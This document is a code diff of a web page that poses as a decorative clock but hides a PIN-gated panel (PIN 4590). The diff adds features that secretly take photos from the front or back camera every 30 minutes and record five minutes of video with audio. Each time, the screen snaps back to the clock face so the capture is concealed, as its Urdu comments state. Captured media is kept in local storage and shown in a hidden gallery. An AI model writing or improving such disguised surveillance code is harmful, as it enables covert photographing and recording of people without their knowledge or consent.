@@ -5,40 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roman Studio System</title>
     <style>
-        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; position: relative; }
-        #stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; }
-        #clock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; cursor: pointer; position: fixed; top: 0; left: 0; z-index: 999; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px); }
-        #complete-msg { position: absolute; top: 50px; color: #2ecc71; font-weight: bold; font-size: 20px; letter-spacing: 2px; display: none; text-shadow: 0 0 10px #2ecc71; z-index: 1001; animation: blink 2s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: rgba(5, 5, 5, 0.8); box-shadow: 0 0 50px rgba(52, 152, 219, 0.3); }
+        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #clock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; cursor: pointer; position: fixed; top:0; left:0; z-index: 999; background: #000; }
+        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: #050505; }
         .hand { position: absolute; bottom: 50%; left: 50%; transform-origin: bottom; border-radius: 10px; }
         .hour { width: 6px; height: 50px; background: white; z-index: 3; }
         .minute { width: 4px; height: 80px; background: #888; z-index: 2; }
         .second { width: 2px; height: 95px; background: #e74c3c; z-index: 1; }
-        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; font-weight: bold; text-shadow: 0 0 10px #3498db; }
-        #pin-screen { display: none; text-align: center; width: 100%; height: 100vh; background: rgba(0, 0, 0, 0.9); position: fixed; top: 0; z-index: 1000; padding-top: 25vh; backdrop-filter: blur(10px); }
+        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; animation: blink 2s infinite; font-weight: bold; }
+        @keyframes blink { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
+
+        #pin-screen { display: none; text-align: center; width: 100%; height: 100vh; background: #000; position: fixed; top:0; z-index: 1000; padding-top: 25vh; }
         input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: #111; color: white; border: 1px solid #333; border-radius: 12px; outline: none; }
+
         #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: #000; position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
+        video { width: 100%; max-width: 320px; border-radius: 15px; background: #111; margin: 0 auto 15px; display: block; border: 2px solid #222; }
         .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
-        .btn-blue { background: #2c3e50; border: 1px solid #3498db; }
-        .btn-green { background: #27ae60; }
-        .btn-purple { background: #8e44ad; }
-        .btn-red { background: #c0392b; }
-        .sub-menu { display: none; background: #111; padding: 10px; border-radius: 12px; margin-bottom: 10px; }
-        .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; }
+        .btn-blue { background: #3498db; }
+        .btn-green { background: #2ecc71; }
+        .btn-orange { background: #f39c12; }
+        .btn-red { background: #e74c3c; }
+        .sub-menu { display: none; background: #111; padding: 10px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
+
+        #gallery-container { display: none; margin-top: 20px; }
+        .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding-bottom: 50px; }
         .card { background: #111; padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
-        .card img { width: 100%; border-radius: 8px; }
-        .back-btn { position: absolute; top: 20px; left: 20px; background: rgba(52, 152, 219, 0.3); color: white; border: 1px solid #3498db; padding: 10px 20px; cursor: pointer; z-index: 1002; display: none; }
-        .progress-container { width: 100%; max-width: 320px; background: #222; border-radius: 10px; margin: 10px auto; display: none; height: 10px; overflow: hidden; }
-        .progress-bar { height: 100%; background: #3498db; width: 0%; transition: width 0.3s; }
+        .card img, .card video { width: 100%; border-radius: 8px; margin-bottom: 5px; }
+        .del-btn { background: #e74c3c; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 12px; }
     </style>
 </head>
 <body>
-    <canvas id="stars"></canvas>
-    <button class="back-btn" id="main-back" onclick="goBackToClock()">← Back</button>
 
     <div id="clock-screen" onclick="openPin()">
-        <div id="complete-msg">COMPLETE</div>
         <div class="clock">
             <div id="hour" class="hand hour"></div>
             <div id="min" class="hand minute"></div>
@@ -50,123 +48,195 @@
     <div id="pin-screen">
         <h3>System Access</h3>
         <input type="password" id="pinIn" maxlength="4" oninput="checkPin(this.value)" placeholder="****">
+        <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer;">Back</p>
     </div>
 
     <div id="admin-panel">
-        <h3 style="text-align:center; color:#3498db;">PHOTO MONITOR</h3>
-        <div class="progress-container" id="prog-cont"><div class="progress-bar" id="prog-bar"></div></div>
-        
-        <video id="preview" autoplay playsinline muted style="display:none; width:100%; max-width:320px; margin: 0 auto; border-radius:10px;"></video>
+        <h3 style="text-align:center; color:#3498db;">System Control</h3>
+        <video id="preview" autoplay playsinline muted style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
-        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Camera</button>
+        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Cam Options</button>
         <div id="front-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startCapture('user')">Start 20 Photos</button>
+            <button class="btn btn-green" onclick="startAutoPhoto('user')">Auto Photo (20 Snaps)</button>
+            <button class="btn btn-orange" onclick="startVideoRecording('user')">Record 5 Min Video</button>
         </div>
 
-        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Camera</button>
+        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Cam Options</button>
         <div id="back-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startCapture('environment')">Start 20 Photos</button>
+            <button class="btn btn-green" onclick="startAutoPhoto('environment')">Auto Photo (20 Snaps)</button>
+            <button class="btn btn-orange" onclick="startVideoRecording('environment')">Record 5 Min Video</button>
         </div>
 
-        <button class="btn btn-purple" onclick="updateGallery()">Refresh Gallery</button>
-        <div class="gallery" id="gallery"></div>
+        <button class="btn btn-blue" style="background:#8e44ad;" onclick="toggleGallery()">View Gallery</button>
+        
+        <button class="btn btn-red" onclick="location.reload()">Lock System</button>
 
-        <div style="display: flex; gap: 10px; margin-top: 20px;">
-            <button class="btn btn-green" onclick="downloadAll()">Download All</button>
-            <button class="btn btn-red" onclick="deleteAll()">Clear All</button>
+        <div id="gallery-container">
+            <h4 style="text-align:center; border-top:1px solid #333; padding-top:10px;">Stored Media</h4>
+            <div id="gallery" class="gallery"></div>
+            <button class="btn btn-red" onclick="toggleGallery()">Close Gallery</button>
         </div>
     </div>
 
     <script>
-        let db;
-        const request = indexedDB.open("RomanStudioDB", 2);
-        request.onupgradeneeded = e => {
-            db = e.target.result;
-            if (!db.objectStoreNames.contains("vault")) db.createObjectStore("vault", { keyPath: "id" });
-        };
-        request.onsuccess = e => { db = e.target.result; updateGallery(); };
+        // Clock functionality
+        function runClock() {
+            const now = new Date();
+            document.getElementById('sec').style.transform = `translateX(-50%) rotate(${now.getSeconds()*6}deg)`;
+            document.getElementById('min').style.transform = `translateX(-50%) rotate(${now.getMinutes()*6}deg)`;
+            document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(now.getHours()%12)*30 + now.getMinutes()/2}deg)`;
+        }
+        setInterval(runClock, 1000);
 
-        let currentStream = null, photoInterval = null, photoCount = 0;
+        function openPin() { document.getElementById('pin-screen').style.display='block'; }
+        
+        function goBackToClock() {
+            document.getElementById('pin-screen').style.display='none';
+            document.getElementById('admin-panel').style.display='none';
+            document.getElementById('clock-screen').style.display='flex';
+            document.getElementById('pinIn').value = '';
+        }
+        
+        function checkPin(v) { 
+            if(v==='4590') { 
+                document.getElementById('pin-screen').style.display='none'; 
+                document.getElementById('clock-screen').style.display='none'; 
+                document.getElementById('admin-panel').style.display='block'; 
+                updateGallery();
+            } 
+        }
 
-        function openPin() { document.getElementById('pin-screen').style.display = 'block'; document.getElementById('clock-screen').style.display = 'none'; }
-        function goBackToClock() { location.reload(); }
-        function checkPin(v) { if(v === '4590') { document.getElementById('pin-screen').style.display = 'none'; document.getElementById('admin-panel').style.display = 'block'; document.getElementById('main-back').style.display = 'block'; } }
-        function toggleSub(id) { let e = document.getElementById(id); e.style.display = (e.style.display === 'block') ? 'none' : 'block'; }
+        function toggleSub(id) {
+            let el = document.getElementById(id);
+            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+        }
 
-        async function startCapture(cam) {
-            if (photoInterval) clearInterval(photoInterval);
-            photoCount = 0;
+        function toggleGallery() {
+            let el = document.getElementById('gallery-container');
+            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+            if(el.style.display === 'block') updateGallery();
+        }
+
+        // Global Variables
+        let currentStream = null;
+        let currentRecorder = null;
+        let photoInterval = null;
+        let videoTimeout = null;
+        let chunks = [];
+
+        // Updated Auto Photo with Auto-Back
+        async function startAutoPhoto(camType) {
+            stopAllActivities();
+            goBackToClock(); // فورا گھڑی پر واپس جائیں
+            
             try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
-                document.getElementById('preview').srcObject = currentStream;
-                document.getElementById('prog-cont').style.display = 'block';
-
-                photoInterval = setInterval(async () => {
-                    if (photoCount >= 20) {
-                        clearInterval(photoInterval);
-                        currentStream.getTracks().forEach(t => t.stop());
-                        alert("20 Photos Saved Successfully!");
-                        return;
+                currentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: camType },
+                    audio: false 
+                });
+                
+                const preview = document.getElementById('preview');
+                preview.srcObject = currentStream;
+                
+                let count = 0;
+                const takeSnap = () => {
+                    if(count < 20) {
+                        takePhoto();
+                        count++;
+                    } else {
+                        stopAllActivities();
                     }
-                    takePhoto();
-                    photoCount++;
-                    document.getElementById('prog-bar').style.width = (photoCount / 20) * 100 + '%';
-                }, 10000); // 10 سیکنڈ
+                };
+
+                takeSnap(); // پہلی فوٹو
+                photoInterval = setInterval(takeSnap, 30 * 60 * 1000); // ہر 30 منٹ بعد
+                
             } catch(e) { alert("Camera Error!"); }
         }
 
+        // Updated Video Recording with Auto-Back
+        async function startVideoRecording(camType) {
+            stopAllActivities();
+            goBackToClock(); // فورا گھڑی پر واپس جائیں
+            
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: camType },
+                    audio: true 
+                });
+                
+                currentRecorder = new MediaRecorder(currentStream);
+                chunks = [];
+                currentRecorder.ondataavailable = e => chunks.push(e.data);
+                currentRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => saveData('vid', reader.result);
+                };
+                
+                currentRecorder.start();
+                videoTimeout = setTimeout(() => {
+                    if(currentRecorder.state === "recording") {
+                        currentRecorder.stop();
+                        stopAllActivities();
+                    }
+                }, 5 * 60 * 1000); // 5 منٹ
+                
+            } catch(e) { alert("Recording Error!"); }
+        }
+
         function takePhoto() {
-            const c = document.getElementById('canvas'), p = document.getElementById('preview');
-            c.width = p.videoWidth; c.height = p.videoHeight;
-            c.getContext('2d').drawImage(p, 0, 0);
-            const data = c.toDataURL('image/jpeg', 0.7);
-            const entry = { id: Date.now().toString(), d: data, time: new Date().toLocaleString('ur-PK') };
-            const tx = db.transaction("vault", "readwrite");
-            tx.objectStore("vault").add(entry);
-            tx.oncomplete = () => { showComplete(); updateGallery(); };
+            const preview = document.getElementById('preview');
+            const canvas = document.getElementById('canvas');
+            if(!preview.srcObject) return;
+            canvas.width = 640; 
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(preview, 0, 0, 640, 480);
+            saveData('img', canvas.toDataURL('image/jpeg', 0.7));
+        }
+
+        function stopAllActivities() {
+            if(photoInterval) clearInterval(photoInterval);
+            if(videoTimeout) clearTimeout(videoTimeout);
+            if(currentRecorder && currentRecorder.state === "recording") currentRecorder.stop();
+            if(currentStream) currentStream.getTracks().forEach(t => t.stop());
+            photoInterval = null; videoTimeout = null; currentStream = null;
+        }
+
+        function saveData(type, data) {
+            let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
+            storage.push({ t: type, d: data, time: new Date().toLocaleString() });
+            localStorage.setItem('rvault', JSON.stringify(storage));
         }
 
         function updateGallery() {
-            const store = db.transaction("vault", "readonly").objectStore("vault");
-            store.getAll().onsuccess = e => {
-                const res = e.target.result;
-                document.getElementById('gallery').innerHTML = res.reverse().map(item => `
-                    <div class="card"><img src="${item.d}"><small>${item.time}</small></div>
-                `).join('');
-            };
+            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
+            const gallery = document.getElementById('gallery');
+            gallery.innerHTML = '';
+            storage.slice().reverse().forEach((item, index) => {
+                const actualIndex = storage.length - 1 - index;
+                const media = item.t === 'img' 
+                    ? `<img src="${item.d}">` 
+                    : `<video src="${item.d}" controls></video>`;
+                gallery.innerHTML += `
+                    <div class="card">
+                        ${media}
+                        <p style="font-size:9px;">${item.time}</p>
+                        <button class="del-btn" onclick="deleteItem(${actualIndex})">Delete</button>
+                    </div>`;
+            });
         }
 
-        async function downloadAll() {
-            const store = db.transaction("vault", "readonly").objectStore("vault");
-            store.getAll().onsuccess = async e => {
-                for (let item of e.target.result) {
-                    const a = document.createElement('a'); a.href = item.d; a.download = `RS_${item.id}.jpg`;
-                    a.click(); await new Promise(r => setTimeout(r, 600));
-                }
-            };
+        function deleteItem(index) {
+            if(confirm("Delete this?")) {
+                let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
+                storage.splice(index, 1);
+                localStorage.setItem('rvault', JSON.stringify(storage));
+                updateGallery();
+            }
         }
-
-        function deleteAll() { if(confirm("Delete All?")) { db.transaction("vault", "readwrite").objectStore("vault").clear().onsuccess = () => updateGallery(); } }
-        function showComplete() { const m = document.getElementById('complete-msg'); m.style.display = 'block'; setTimeout(() => m.style.display = 'none', 2000); }
-
-        setInterval(() => {
-            const n = new Date();
-            document.getElementById('sec').style.transform = `translateX(-50%) rotate(${n.getSeconds() * 6}deg)`;
-            document.getElementById('min').style.transform = `translateX(-50%) rotate(${n.getMinutes() * 6}deg)`;
-            document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(n.getHours() % 12) * 30 + n.getMinutes() / 2}deg)`;
-        }, 1000);
-
-        // Stars Background
-        const canvas = document.getElementById('stars'); const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const stars = Array(200).fill().map(() => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, sp: Math.random()*0.5 }));
-        function draw() {
-            ctx.fillStyle = '#000'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle = '#fff';
-            stars.forEach(s => { s.y += s.sp; if(s.y > canvas.height) s.y = 0; ctx.beginPath(); ctx.arc(s.x, s.y, s.s, 0, 7); ctx.fill(); });
-            requestAnimationFrame(draw);
-        }
-        draw();
     </script>
 </body>
 </html>
